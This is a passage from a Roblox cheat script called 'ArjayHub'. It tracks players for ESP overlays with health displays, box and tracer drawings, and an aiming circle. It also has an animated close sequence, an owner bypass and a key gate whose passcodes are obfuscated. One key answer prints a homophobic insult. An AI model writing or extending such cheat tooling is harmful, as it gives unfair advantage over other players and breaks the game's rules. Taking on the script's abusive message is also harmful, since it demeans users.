			local humanoid = character:WaitForChild("Humanoid", 5)
			if not humanoid then return end
			hpConn   = humanoid.HealthChanged:Connect(function() updatePlayerDisplay(player, lbl, highlight) end)
			diedConn = humanoid.Died:Connect(function() updatePlayerDisplay(player, lbl, highlight) end)
			updatePlayerDisplay(player, lbl, highlight)
		end

		player.CharacterAdded:Connect(function(c) if running then setup(c) end end)
		if player.Character then task.spawn(setup, player.Character) end

		task.spawn(function()
			while running and player.Parent do
				if getgenv().ESP then
					updatePlayerDisplay(player, lbl, highlight)
				elseif lbl or highlight then
					cleanup()
				end
				task.wait(1)
			end
			cleanup()
		end)
	end

	for _, p in ipairs(Players:GetPlayers()) do task.spawn(trackPlayer, p) end
	Players.PlayerAdded:Connect(function(p) if running then task.spawn(trackPlayer, p) end end)

	-- ══════════════════════════════════════════════════════════
	--  Outro
	-- ══════════════════════════════════════════════════════════

	-- cleanup Drawing objects when players leave
	Players.PlayerRemoving:Connect(function(p) removePlayerDrawings(p) end)

	local function outro()
		if not running then return end
		running = false
		rsConn:Disconnect()
		if _saInputConn then _saInputConn:Disconnect() _saInputConn = nil end
		cir:Remove()
		for _, l in ipairs(chexLines) do pcall(function() l:Remove() end) end
		-- remove all box/tracer drawings
		for _, p in ipairs(Players:GetPlayers()) do removePlayerDrawings(p) end
		toggleBtn:Destroy()

		-- clean up ESP
		for _, plr in ipairs(Players:GetPlayers()) do
			local ch = plr.Character
			if ch then
				local hl = ch:FindFirstChild("HealthHighlight")
				if hl then hl:Destroy() end
				local head = ch:FindFirstChild("Head")
				local bb = head and head:FindFirstChild("HealthDisplay")
				if bb then bb:Destroy() end
			end
		end

		-- fold wings
		for _, w in ipairs(wings) do
			if w.flap then w.flap:Cancel() end
			tween(w.frame, 0.7, { Size = UDim2.new(0, 0, 0, 0), Rotation = 0 },
				Enum.EasingStyle.Quint, Enum.EasingDirection.In)
		end

		-- fade sakura layer
		if sakuraCleanup then sakuraCleanup() end

		task.delay(0.5, function()
			tween(hub, 0.6, { Size = UDim2.new(0, 0, 0, 0), Rotation = 8 },
				Enum.EasingStyle.Back, Enum.EasingDirection.In)
		end)

		stopSong(song, 1.8)

		local closeTop = Instance.new("Frame")
		closeTop.Size = UDim2.new(1, 0, 0.5, 0)
		closeTop.Position = UDim2.new(0, 0, -0.5, 0)
		closeTop.BackgroundColor3 = CONFIG.WHITE
		closeTop.BorderSizePixel = 0
		closeTop.ZIndex = 60
		closeTop.Parent = root

		local closeBot = Instance.new("Frame")
		closeBot.Size = UDim2.new(1, 0, 0.5, 0)
		closeBot.Position = UDim2.new(0, 0, 1, 0)
		closeBot.BackgroundColor3 = CONFIG.WHITE
		closeBot.BorderSizePixel = 0
		closeBot.ZIndex = 60
		closeBot.Parent = root

		task.delay(0.9, function()
			tween(closeTop, 0.9, { Position = UDim2.new(0, 0, 0, 0) },
				Enum.EasingStyle.Quint, Enum.EasingDirection.InOut)
			tween(closeBot, 0.9, { Position = UDim2.new(0, 0, 0.5, 0) },
				Enum.EasingStyle.Quint, Enum.EasingDirection.InOut)
		end)

		local bye = label(closeTop, "until next time", 16, Enum.Font.GothamMedium, CONFIG.ACCENT, 61)
		bye.AnchorPoint = Vector2.new(0.5, 0.5)
		bye.Position = UDim2.new(0.5, 0, 1, 0)
		bye.Size = UDim2.new(0, 400, 0, 24)
		bye.TextXAlignment = Enum.TextXAlignment.Center
		bye.TextTransparency = 1
		task.delay(1.6, function() tween(bye, 0.8, { TextTransparency = 0 }) end)

		task.delay(3.4, function() root:Destroy() end)
	end

	closeBtn.MouseButton1Click:Connect(outro)

	UserInputService.InputBegan:Connect(function(input, gp)
		if not gp and input.KeyCode == Enum.KeyCode.RightShift and running then
			toggleBtn.MouseButton1Click:Fire()
		end
	end)
end

-- ══════════════════════════════════════════════════════════════
--  Start
-- ══════════════════════════════════════════════════════════════

local function Start()
	local root = Instance.new("ScreenGui")
	root.Name = "ArjayHub"
	root.ResetOnSpawn = false
	root.IgnoreGuiInset = true
	root.DisplayOrder = 999
	protect(root)

	local song = makeSong(root)

	local preloadImg = Instance.new("ImageLabel")
	preloadImg.Size = UDim2.new(0, 0, 0, 0)
	preloadImg.BackgroundTransparency = 1
	preloadImg.Image = CONFIG.LAUFEY_IMAGE_ID
	preloadImg.Parent = root
	task.spawn(function()
		pcall(function() ContentProvider:PreloadAsync({ preloadImg }) end)
	end)

	-- sakura starts here so petals fall during the intro reveal
	local sakuraCleanup = makeSakura(root)

	showIntro(root, song, function()
		buildHub(root, song, sakuraCleanup)
	end)
end

-- ══════════════════════════════════════════════════════════════
--  Owner bypass
-- ══════════════════════════════════════════════════════════════

if LocalPlayer and (LocalPlayer.Name == resolve(user_data) or LocalPlayer.DisplayName == resolve(user_data)) then
	Start()
	return
end

-- ══════════════════════════════════════════════════════════════
--  Key gate
-- ══════════════════════════════════════════════════════════════

local kg = Instance.new("ScreenGui")
kg.Name = "KeyGate"
protect(kg)

local mf = Instance.new("Frame")
mf.Parent = kg
mf.BackgroundColor3 = CONFIG.WHITE
mf.Position = UDim2.new(0.4, 0, 0.4, 0)
mf.Size = UDim2.new(0, 200, 0, 130)
mf.Active = true
mf.Draggable = true
mf.BorderSizePixel = 0
round(mf, 12)
stroke(mf, CONFIG.ACCENT, 1, 0.4)

local kt = Instance.new("TextLabel")
kt.Parent = mf
kt.Size = UDim2.new(1, 0, 0, 28)
kt.BackgroundTransparency = 1
kt.Text = "SYSTEM ACCESS"
kt.Font = Enum.Font.GothamBold
kt.TextSize = 13
kt.TextColor3 = CONFIG.INK

local ki = Instance.new("TextBox")
ki.Parent = mf
ki.Position = UDim2.new(0, 15, 0, 42)
ki.Size = UDim2.new(1, -30, 0, 30)
ki.Text = ""
ki.PlaceholderText = "Input passcode..."
ki.Font = Enum.Font.Gotham
ki.TextSize = 12
ki.TextColor3 = CONFIG.INK
ki.BackgroundColor3 = CONFIG.PANEL_2
round(ki, 8)

local vb = Instance.new("TextButton")
vb.Parent = mf
vb.Position = UDim2.new(0, 15, 0, 84)
vb.Size = UDim2.new(1, -30, 0, 30)
vb.BackgroundColor3 = CONFIG.ON
vb.AutoButtonColor = false
vb.Text = "SUBMIT"
vb.Font = Enum.Font.GothamMedium
vb.TextSize = 12
vb.TextColor3 = CONFIG.INK
round(vb, 8)

local rt = ""
ki:GetPropertyChangedSignal("Text"):Connect(function()
	local current = ki.Text
	if current == "Invalid Token." or current == "" then
		if current == "" then rt = "" end
		return
	end
	if #current > #rt then
		rt = rt .. string.sub(current, #current)
	elseif #current < #rt then
		rt = string.sub(rt, 1, #current)
	end
	ki.Text = string.rep("*", #rt)
end)

vb.MouseButton1Click:Connect(function()
	if rt == resolve(key1_data) then
		kt.Text = "too gay too use this blud fuck yourself"
		rt = ""
		ki.Text = ""
	elseif rt == resolve(key2_data) or rt == resolve(key3_data) then
		kg:Destroy()
		Start()
	else
		rt = ""
		ki.Text = ""
		ki.PlaceholderText = "Invalid Token."
	end
end)
